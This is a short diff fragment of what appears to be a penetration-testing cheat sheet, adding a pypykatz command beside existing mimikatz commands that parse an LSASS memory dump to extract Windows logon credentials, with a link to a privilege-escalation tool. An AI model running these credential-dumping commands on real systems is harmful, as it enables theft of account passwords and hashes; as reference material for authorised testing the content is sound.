@@ -554,6 +554,9 @@ sekurlsa::minidump lsass.dmp
 
 sekurlsa::logonpasswords
 ```
+```bash
+pypykatz lsa minidump <DMP file>
+```
 
 - `https://github.com/decoder-it/psgetsystem`
 ```powershell
